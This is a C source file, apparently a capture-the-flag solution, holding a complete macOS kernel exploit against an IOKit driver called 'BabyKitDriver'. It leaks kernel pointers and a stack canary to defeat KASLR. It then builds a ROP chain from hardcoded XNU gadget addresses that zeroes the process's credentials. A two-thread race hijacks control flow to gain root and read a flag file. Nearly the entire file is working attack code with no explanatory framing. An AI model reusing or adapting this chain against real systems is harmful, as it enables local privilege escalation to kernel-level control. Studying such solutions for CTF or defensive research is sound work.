#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

#include <mach/mach.h>
#include <IOKit/IOKitLib.h>


// flag: flag{7ac21f7848a39f0aea63fa29d304226a}

#define DEBUG 0


#define mcheck(res)                                                                     \
    if ((res) != KERN_SUCCESS) {                                                        \
        printf("line-%d: failed - %d - %s\n", __LINE__, res, mach_error_string(res));   \
        goto err;                                                                       \
    }

#define BABY_READ       0
#define BABY_LEAVEMSG   1

union baby_args_t {
    struct {
        uint64_t version;
        uint64_t vaddr;
        uint64_t len;
    } bleavemsg;
    struct {
        uint64_t vaddr;
        uint64_t len;
    } bread;
};

io_connect_t conn = IO_OBJECT_NULL;

kern_return_t baby_leave_msg(uint64_t version, void *addr, uint64_t len)
{
    union baby_args_t args;
    args.bleavemsg.version = version;
    args.bleavemsg.vaddr = (uint64_t) addr;
    args.bleavemsg.len = len;
    return IOConnectCallScalarMethod(conn, BABY_LEAVEMSG, (uint64_t *)&args, 3, NULL, 0);
}

kern_return_t baby_read(void *addr, uint64_t len)
{
    union baby_args_t args;
    args.bread.vaddr = (uint64_t) addr;
    args.bread.len = len;
    return IOConnectCallScalarMethod(conn, BABY_READ, (uint64_t *)&args, 2, NULL, 0);
}

// #define FLAG "/var/root/.forward"
#define FLAG "/flag"

volatile uint64_t stop_cond = 0;
void *test_fn(void *arg)
{
    void *mbuf = calloc(1, 0x40);
    uint64_t *cbuf = arg;
    while (stop_cond == 0) {
        baby_read(0, 0);
    }
    return NULL;
}

int main(int argc, char **argv)
{
    uint8_t *cbuf = calloc(1, 0x1000);

    kern_return_t res = KERN_FAILURE;
    io_service_t serv = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("BabyKitDriver"));
    if (!serv) {
        printf("line-%d: get matching service failed\n!", __LINE__);
        return -1;
    }

    res = IOServiceOpen(serv, current_task(), 0, &conn);
    if (res != KERN_SUCCESS) {
        goto err;
    }

    // setup!???
    // pthread_t pthr2;
    // pthread_create(&pthr2, 0, cat_flag, 0);


    ////////////////////////


    union baby_args_t args;
    res = baby_leave_msg(1, 0, 0);
    mcheck(res);

    baby_leave_msg(0, 0, 0);
    res = baby_read(cbuf, 0);
    uint64_t kext_base = (*(uint64_t*)&cbuf[0]) - 0x1090;
    printf("kext base: %p\n", (void *)kext_base);


    // leak other things
    res = baby_leave_msg(1, 0, 0);
    mcheck(res);
    res = baby_read(cbuf, 0xffffffffffff0400);
    mcheck(res);

#if DEBUG
    for (int i = 0; i < 0x400; i+=16) {
        printf("%04x: 0x%016llx 0x%016llx\n", i, *(uint64_t *)&cbuf[i], *(uint64_t *)&cbuf[i+8]);
    }
#endif

    uint64_t canary = *(uint64_t *)&cbuf[0x308];
    uint64_t rbp = *(uint64_t *)&cbuf[0x310];
    uint64_t xnuaddr = *(uint64_t *)&cbuf[0x368];

    printf("canary: %p\n", (void *)canary);
    printf("rbp: %p\n", (void *)rbp);
    printf("xnuaddr: %p\n", (void *)xnuaddr);

    uintptr_t kslide = xnuaddr - 0x876d2e - 0xffffff8000200000;

    uintptr_t current_proc = 0xffffff8000989860ULL;
    uintptr_t proc_ucred = 0xffffff80008556b0ULL;
    uintptr_t posix_cred_get = 0xffffff800081c440ULL;

    uintptr_t pop_rcx_ret = 0xffffff800034fb88ULL;

    // mov rdi, rax ; pop rbp ; jmp rcx
    uintptr_t mov_rdi_rax_pop_rbp_jmp_rcx = 0xffffff8000364001ULL;

    // mov dword ptr [rax], 0 ; xor eax, eax ; pop rbp ; ret
    uintptr_t store_zero_rax_pop_ret = 0xffffff8000586a82ULL;

    uintptr_t thread_exception_return = 0xffffff8000334dcaULL;

    // Set rip to this to start the chain.
    // mov rdi, rsi; call ptr [rsi+0x10]
    uintptr_t start_chain = 0xffffff8000a8d2d9ULL;

    // push rdi; pop rsp
    // add rsp, 0x28
    // pop6
    // ret
    uintptr_t get_rop_gadget = 0xffffff80007b98d1ULL;

    uintptr_t pop_rsp_ret = 0xffffff800036986f;
    uintptr_t pop_rdi_ret = 0xffffff8000334e74;
    uintptr_t pop_rsi_ret = 0xffffff8000351ed4;
    uintptr_t pop_rdx_ret = 0xffffff80006ff654;
    uintptr_t pop_r8_add_eax_ret = 0xffffff80004db621;
    uintptr_t pop_rax_ret = 0xffffff8000335310;

    uintptr_t zone_ro_clear = 0xffffff8000406360;

    // mov rsi, rdi; mov rdi, rdx; mov rdx, rax; pop rbp; jmp rcx;
    uintptr_t mov_rsi_rdi_ext_jmp_rcx = 0xffffff8000979f53;

    uintptr_t thread_block = 0xffffff80003c34e0;

    uintptr_t jmp_rax = 0xffffff8000337408; // : jmp rax;
    uintptr_t iosleep = 0xffffff80009f66a0;

    uintptr_t rop_chain[] = {
        kslide + start_chain,
        0,
        0,
        kslide + get_rop_gadget,
        0, 0,              // add rsp, 0x28 (minus 0x18 for above)
        0, 0, 0, 0, 0, 0,  // pop6
        kslide + current_proc,
        kslide + pop_rcx_ret,
        kslide + proc_ucred,
        kslide + mov_rdi_rax_pop_rbp_jmp_rcx,
        0,
        kslide + pop_rcx_ret,
        kslide + pop_rax_ret,
        kslide + mov_rdi_rax_pop_rbp_jmp_rcx,
        0,
        0x18, // value to set in rdx
        kslide + pop_rdx_ret,
        7, // ZONE ID
        kslide + pop_rcx_ret,
        kslide + pop_rcx_ret,
        kslide + mov_rsi_rdi_ext_jmp_rcx,
        0,
        8, // size
        kslide + zone_ro_clear,

        kslide + pop_rax_ret,
        kslide + jmp_rax,
        kslide + jmp_rax,
    };

    printf("%lu\n", sizeof(rop_chain));
    fflush(stdout);
    sleep(1);
    memcpy(cbuf, rop_chain, sizeof(rop_chain));

    res = baby_leave_msg(1, cbuf, 0x200);
    mcheck(res);

    // Test if racing works
    pthread_t thr;
    int pret = pthread_create(&thr, NULL, test_fn, cbuf);
    if (pret != 0) {
        printf("pthread failed: %d\n", pret);
        goto err;
    }


    {
        while (1) {
            baby_leave_msg(0, cbuf, 0);
            baby_leave_msg(1, &cbuf[8], 4);
            if ((getuid() == 0) || (geteuid() == 0)) {
                printf("got root maybe11 - %d - %d\n", getuid(), geteuid());
                char buf[256];
                int fd = open(FLAG, 0);
                int sz = read(fd, buf, 256);
                buf[sz++] = '\n';
                buf[sz++] = '\0';
                write(1, buf, sz);
                write(1, buf, sz);
                write(1, buf, sz);
                fflush(stdout);
                close(fd);
                sleep(3);
            }
        }
    }

    res = KERN_SUCCESS;
err:
    pthread_join(thr, NULL);
    if (conn != IO_OBJECT_NULL) {
        IOServiceClose(conn);
    }
    IOObjectRelease(serv);
    return res;
}
